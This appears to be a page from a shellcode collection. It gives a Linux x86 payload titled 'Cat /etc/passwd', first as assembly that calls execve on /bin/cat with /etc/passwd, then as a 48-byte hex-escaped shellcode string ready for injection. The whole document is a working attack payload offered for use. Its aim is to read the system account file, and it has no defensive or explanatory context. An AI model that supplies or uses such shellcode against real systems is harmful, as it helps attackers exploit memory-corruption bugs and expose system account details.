Cat /etc/passwd
====

# x86 version

<pre>
xor    eax,eax
push   eax
push   0x7461632f
push   0x6e69622f
mov    ebx,esp
push   eax
push   0x64777373
push   0x61702f63
push   0x74652f2f
mov    ecx,esp
push   eax
push   ecx
push   ebx
mov    ecx,esp
push   eax
mov    edx,esp
mov    eax,0xb
int    0x80
</pre>

Read the asm file for the commented version

Shellcode

<pre>
"\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe1\x50\x51\x53\x89\xe1\x50\x89\xe2\xb8\x0b\x00\x00\x00\xcd\x80"
</pre>

Length : 48 bytes